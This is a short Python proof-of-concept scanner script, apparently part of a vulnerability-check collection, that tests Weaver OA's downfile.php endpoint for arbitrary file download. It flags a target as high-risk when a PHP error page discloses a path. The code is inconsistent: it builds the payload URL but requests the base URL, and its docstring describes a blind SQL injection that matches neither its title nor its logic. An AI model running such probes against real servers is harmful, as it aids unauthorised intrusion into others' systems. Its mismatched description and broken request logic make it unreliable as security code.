#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 泛微OA downfile.php 任意文件下载漏洞
referer: 
author: Lucifer
description: fileid参数引起的布尔盲注。
'''
import re
import sys
import requests
import warnings
from termcolor import cprint

class weaver_oa_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/E-mobile/Data/downfile.php?url=123"
        vulnurl = self.url + payload
        try:
            req = requests.get(self.url, headers=headers, timeout=10, verify=False)
            if req.status_code == 200:
                m = re.search(r'No error in <b>([^<]+)</b>', req.text)
                if m:
                    cprint("[+]存在泛微OA downfile.php 任意文件下载漏洞...(高危)\tpayload: "+self.url, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = weaver_oa_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()